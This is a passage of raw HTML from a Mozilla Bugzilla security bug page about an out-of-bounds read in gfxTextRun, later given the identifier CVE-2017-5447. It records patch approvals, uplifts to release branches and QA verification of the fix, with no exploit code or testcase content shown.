      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-29" data-comment-id="12124995">sec-approval+ for trunk. We'll want branch patches made and nominated as well.</pre><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox52&amp;o1=isnotempty">status-firefox52</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox52&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox52&amp;o1=equals&amp;v1=wontfix">wontfix</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox55&amp;o1=isnotempty">status-firefox55</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox55&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox52&amp;o1=isnotempty">tracking-firefox52</a>:
          <a href="/buglist.cgi?f1=cf_tracking_firefox52&amp;o1=equals&amp;v1=%3F">?</a> &rarr; ---</div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox55&amp;o1=isnotempty">tracking-firefox55</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox55&amp;o1=equals&amp;v1=%2B">+</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr45&amp;o1=isnotempty">tracking-firefox-esr45</a>:
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr45&amp;o1=equals&amp;v1=%3F">?</a> &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox_esr45&amp;o1=equals&amp;v1=53%2B">53+</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr52&amp;o1=isnotempty">tracking-firefox-esr52</a>:
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr52&amp;o1=equals&amp;v1=%3F">?</a> &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox_esr52&amp;o1=equals&amp;v1=53%2B">53+</a></div></div></div><div class="change-set" id="a567396_280903"><div class="change" id="aa567396_280903">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a567396_280903"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_280903" id="a567396_280903"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a567396_280903"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a567396_280903">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#a567396_280903">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-07 21:33 PST" data-time="1488951205">5 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8843917&amp;action=edit"
           title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes."
           class=""
        >Attachment #8843917</a> -
        Flags: sec-approval? &rarr; sec-approval+</div></div></div><div class="change-set" id="c30"><div class="comment" data-id="12132124" data-no="30"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-30" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_308534" id="a567396_280903"><img src="https://secure.gravatar.com/avatar/bb55b2a8c34fd29f570ca139f13d46b8?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_308534" id="a567396_280903"><a class="email " href="/user_profile?user_id=308534" > <span class="fna">Wes Kocher (:KWierso) (Not reading bugmail; email directly if needed)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-30"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-30" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c30">Comment 30</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-09 16:36 PST" data-time="1489106195">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-30">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-30" data-comment-id="12132124"><a rel="nofollow" href="https://hg.mozilla.org/mozilla-central/rev/0f7465d1f1bb">https://hg.mozilla.org/mozilla-central/rev/0f7465d1f1bb</a>
<a rel="nofollow" href="https://hg.mozilla.org/mozilla-central/rev/80d9e84735e7">https://hg.mozilla.org/mozilla-central/rev/80d9e84735e7</a></pre><div class="activity"><div class="change">Status: NEW &rarr; RESOLVED</div><div class="change">Closed: <span class="rel-time" title="2017-03-09 16:36 PST" data-time="1489106195">5 years ago</span></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox55&amp;o1=isnotempty">status-firefox55</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox55&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox55&amp;o1=equals&amp;v1=fixed">fixed</a></div><div class="change">Resolution: --- &rarr; FIXED</div><div class="change">Target Milestone: --- &rarr; mozilla55</div></div></div><div class="change-set" id="c31"><div class="comment" data-id="12133869" data-no="31"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-31" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_5168" id="a567396_280903"><img src="https://secure.gravatar.com/avatar/04f630b96bdc20c8df8b8ab26a3a302e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_5168" id="a567396_280903"><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-31"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-31" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c31">Comment 31</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-10 06:20 PST" data-time="1489155629">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-31">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-31" data-comment-id="12133869">Comment on <span class=""><a href="/attachment.cgi?id=8843917" name="attach_8843917" title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.">attachment 8843917</a> <a href="/attachment.cgi?id=8843917&amp;action=edit" title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.">[details]</a> <a href="/attachment.cgi?id=8843917&amp;action=diff" title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1343552&amp;attachment=8843917'>[review]</a>
part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.

Approval Request Comment
[Feature/Bug causing the regression]:
[User impact if declined]: crash or reading out-of-bounds memory contents
[Is this code covered by automated tests?]:yes
[Has the fix been verified in Nightly?]:no
[Needs manual test from QE? If yes, steps to reproduce]: Sure, I don't see why not.  Just load the attached testcases and verify it doesn't crash.
[List of other uplifts needed for the feature/fix]:
[Is the change risky?]:no
[Why is the change risky/not risky?]: we're just ditching a stale cached value in part 1, and adding
an out-of-bounds runtime check in part 2
[String changes made/needed]:none

(the uplift request is for both parts, for all branches that takes security fixes)</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8843917&amp;action=edit"
           title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes."
           class=""
        >Attachment #8843917</a> -
        Flags: approval-mozilla-esr52?</div><div class="change">
        <a href="/attachment.cgi?id=8843917&amp;action=edit"
           title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes."
           class=""
        >Attachment #8843917</a> -
        Flags: approval-mozilla-esr45?</div><div class="change">
        <a href="/attachment.cgi?id=8843917&amp;action=edit"
           title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes."
           class=""
        >Attachment #8843917</a> -
        Flags: approval-mozilla-beta?</div><div class="change">
        <a href="/attachment.cgi?id=8843917&amp;action=edit"
           title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes."
           class=""
        >Attachment #8843917</a> -
        Flags: approval-mozilla-aurora?</div></div></div><div class="change-set" id="c32"><div class="comment" data-id="12134821" data-no="32"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-32" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_451704" id="a567396_280903"><img src="https://secure.gravatar.com/avatar/6168ea97fda0cefa449331e59b24e8f7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_451704" id="a567396_280903"><a class="email " href="/user_profile?user_id=451704" > <span class="fna">Liz Henry (:lizzard Please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-32"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-32" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c32">Comment 32</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-10 10:52 PST" data-time="1489171920">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-32">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-32" data-comment-id="12134821">Comment on <span class=""><a href="/attachment.cgi?id=8843917" name="attach_8843917" title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.">attachment 8843917</a> <a href="/attachment.cgi?id=8843917&amp;action=edit" title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.">[details]</a> <a href="/attachment.cgi?id=8843917&amp;action=diff" title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1343552&amp;attachment=8843917'>[review]</a>
part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.

Sec-high fix, let's take this up to beta right away. Should be in the build for beta 2 next week.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8843917&amp;action=edit"
           title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes."
           class=""
        >Attachment #8843917</a> -
        Flags: <span class="activity-deleted">approval-mozilla-beta?</span></div><div class="change">
        <a href="/attachment.cgi?id=8843917&amp;action=edit"
           title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes."
           class=""
        >Attachment #8843917</a> -
        Flags: approval-mozilla-beta+</div><div class="change">
        <a href="/attachment.cgi?id=8843917&amp;action=edit"
           title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes."
           class=""
        >Attachment #8843917</a> -
        Flags: <span class="activity-deleted">approval-mozilla-aurora?</span></div><div class="change">
        <a href="/attachment.cgi?id=8843917&amp;action=edit"
           title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes."
           class=""
        >Attachment #8843917</a> -
        Flags: approval-mozilla-aurora+</div></div></div><div class="change-set" id="c33"><div class="comment" data-id="12135652" data-no="33"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-33" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a567396_280903"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a567396_280903"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-33"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-33" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c33">Comment 33</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-10 14:59 PST" data-time="1489186769">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-33">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-33" data-comment-id="12135652"><a rel="nofollow" href="https://hg.mozilla.org/releases/mozilla-aurora/rev/ec851660c406">https://hg.mozilla.org/releases/mozilla-aurora/rev/ec851660c406</a>
<a rel="nofollow" href="https://hg.mozilla.org/releases/mozilla-aurora/rev/858b0ab812df">https://hg.mozilla.org/releases/mozilla-aurora/rev/858b0ab812df</a>

<a rel="nofollow" href="https://hg.mozilla.org/releases/mozilla-beta/rev/ddbca773eb53">https://hg.mozilla.org/releases/mozilla-beta/rev/ddbca773eb53</a>
<a rel="nofollow" href="https://hg.mozilla.org/releases/mozilla-beta/rev/ef9c28e77417">https://hg.mozilla.org/releases/mozilla-beta/rev/ef9c28e77417</a></pre><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox53&amp;o1=isnotempty">status-firefox53</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox53&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox53&amp;o1=equals&amp;v1=fixed">fixed</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox54&amp;o1=isnotempty">status-firefox54</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox54&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox54&amp;o1=equals&amp;v1=fixed">fixed</a></div><div class="change">Flags: in-testsuite?</div></div></div><div class="change-set" id="a805966_1689"><div class="change" id="aa805966_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a805966_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a805966_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a805966_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a805966_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#a805966_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-10 15:49 PST" data-time="1489189775">5 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Group: core-security &rarr; core-security-release</div></div></div><div class="change-set" id="c34"><div class="comment" data-id="12138760" data-no="34"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-34" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_580382" id="a805966_1689"><img src="https://secure.gravatar.com/avatar/15b9b3783e4671cd882bff1316df14c9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_580382" id="a805966_1689"><a class="email " href="/user_profile?user_id=580382" > <span class="fna">Julien Cristau [:jcristau]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-34"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-34" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c34">Comment 34</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-13 05:24 PDT" data-time="1489407876">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-34">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-34" data-comment-id="12138760">Comment on <span class=""><a href="/attachment.cgi?id=8843917" name="attach_8843917" title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.">attachment 8843917</a> <a href="/attachment.cgi?id=8843917&amp;action=edit" title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.">[details]</a> <a href="/attachment.cgi?id=8843917&amp;action=diff" title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1343552&amp;attachment=8843917'>[review]</a>
part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.

sec-high fix for both esr branches</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8843917&amp;action=edit"
           title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes."
           class=""
        >Attachment #8843917</a> -
        Flags: <span class="activity-deleted">approval-mozilla-esr52?</span></div><div class="change">
        <a href="/attachment.cgi?id=8843917&amp;action=edit"
           title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes."
           class=""
        >Attachment #8843917</a> -
        Flags: approval-mozilla-esr52+</div><div class="change">
        <a href="/attachment.cgi?id=8843917&amp;action=edit"
           title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes."
           class=""
        >Attachment #8843917</a> -
        Flags: <span class="activity-deleted">approval-mozilla-esr45?</span></div><div class="change">
        <a href="/attachment.cgi?id=8843917&amp;action=edit"
           title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes."
           class=""
        >Attachment #8843917</a> -
        Flags: approval-mozilla-esr45+</div></div></div><div class="change-set" id="c35"><div class="comment" data-id="12139531" data-no="35"
       data-tags="uplift">
    
    <table class="layout-table change-head " id="ch-35" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a805966_1689"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a805966_1689"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-35"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-35" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c35">Comment 35</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-13 08:39 PDT" data-time="1489419561">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-35">
        <td colspan="2" class="comment-tags"><span class="comment-tag">uplift</span>
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-35" data-comment-id="12139531"><a rel="nofollow" href="https://hg.mozilla.org/releases/mozilla-esr52/rev/3bc981f85a17">https://hg.mozilla.org/releases/mozilla-esr52/rev/3bc981f85a17</a>
<a rel="nofollow" href="https://hg.mozilla.org/releases/mozilla-esr52/rev/4f752b0e5920">https://hg.mozilla.org/releases/mozilla-esr52/rev/4f752b0e5920</a>

<a rel="nofollow" href="https://hg.mozilla.org/releases/mozilla-esr45/rev/08bc7a3330e4">https://hg.mozilla.org/releases/mozilla-esr45/rev/08bc7a3330e4</a>
<a rel="nofollow" href="https://hg.mozilla.org/releases/mozilla-esr45/rev/8c61ebe37f1b">https://hg.mozilla.org/releases/mozilla-esr45/rev/8c61ebe37f1b</a></pre><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr45&amp;o1=isnotempty">status-firefox-esr45</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox_esr45&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr45&amp;o1=equals&amp;v1=fixed">fixed</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr52&amp;o1=isnotempty">status-firefox-esr52</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox_esr52&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr52&amp;o1=equals&amp;v1=fixed">fixed</a></div></div></div><div class="change-set" id="a3011832_280903"><div class="change" id="aa3011832_280903">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a3011832_280903"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_280903" id="a3011832_280903"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a3011832_280903"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a3011832_280903">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#a3011832_280903">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-04-05 05:34 PDT" data-time="1491395641">5 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Whiteboard: [adv-main53+][adv-esr52.1+][adv-esr45.9+]</div></div></div><div class="change-set" id="a3172471_280903"><div class="change" id="aa3172471_280903">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a3172471_280903"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_280903" id="a3172471_280903"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a3172471_280903"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a3172471_280903">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#a3172471_280903">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-04-07 02:11 PDT" data-time="1491556280">5 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Alias: CVE-2017-5447</div></div></div><div class="change-set" id="c36"><div class="comment" data-id="12220567" data-no="36"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-36" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_488993" id="a3172471_280903"><img src="https://secure.gravatar.com/avatar/42f2a9436bbaefa7e0028e214f2b9350?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_488993" id="a3172471_280903"><a class="email " href="/user_profile?user_id=488993" > <span class="fna">Andrei Vaida [:avaida]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-36"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-36" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c36">Comment 36</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-04-10 00:50 PDT" data-time="1491810636">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-36">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-36" data-comment-id="12220567">Flagging this for manual testing, instructions in <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - ASAN: out-of-bounds read in gfxTextRun (after &quot;ASSERTION: Invalid offset&quot; and &quot;ASSERTION: Substring out of range&quot;)"
   href="/show_bug.cgi?id=1343552#c31">Comment 31</a>.</pre><div class="activity"><div class="change">Flags: qe-verify+</div></div></div><div class="change-set" id="c37"><div class="comment" data-id="12229177" data-no="37"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-37" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_551058" id="a3172471_280903"><img src="https://secure.gravatar.com/avatar/c5f57c129e6a73ff39a5c61758c85ee8?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_551058" id="a3172471_280903"><a class="email " href="/user_profile?user_id=551058" > <span class="fna">Mihai Boldan, QA [:mboldan]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-37"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-37" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c37">Comment 37</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-04-12 08:05 PDT" data-time="1492009545">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-37">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-37" data-comment-id="12229177">I managed to reproduce this issue on Firefox 45.1.2 ESR ASAN build, under Ubuntu 16.04x64.

The crash is no longer reproducible on Firefox 55.0a1(2017-04-12) ASAN build, Firefox 54.0a2(2017-04-12) ASAN build, 53.0b12 ASAN build, 53.0 ASAN build, Firefox 45.9.0 ESR ASAN build, Firefox 52.1.0 ESR ASAN build, 55.0a1(2017-04-12) build, Firefox 54.0a2(2017-04-12), Firefox 53.0, Firefox 45.8.0 ESR or on Firefox 52.1.0 ESR.
Tests were performed under Ubuntu 16.04x64.</pre><div class="activity"><div class="change">Status: RESOLVED &rarr; VERIFIED</div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox53&amp;o1=isnotempty">status-firefox53</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox53&amp;o1=equals&amp;v1=fixed">fixed</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox53&amp;o1=equals&amp;v1=verified">verified</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox54&amp;o1=isnotempty">status-firefox54</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox54&amp;o1=equals&amp;v1=fixed">fixed</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox54&amp;o1=equals&amp;v1=verified">verified</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox55&amp;o1=isnotempty">status-firefox55</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox55&amp;o1=equals&amp;v1=fixed">fixed</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox55&amp;o1=equals&amp;v1=verified">verified</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr45&amp;o1=isnotempty">status-firefox-esr45</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox_esr45&amp;o1=equals&amp;v1=fixed">fixed</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr45&amp;o1=equals&amp;v1=verified">verified</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr52&amp;o1=isnotempty">status-firefox-esr52</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox_esr52&amp;o1=equals&amp;v1=fixed">fixed</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr52&amp;o1=equals&amp;v1=verified">verified</a></div><div class="change">Flags: <span class="activity-deleted">qe-verify+</span></div></div></div><div class="change-set" id="a7342212_406194"><div class="change" id="aa7342212_406194">
    <table class="layout-table change-head " role="presentation">
      <tr>
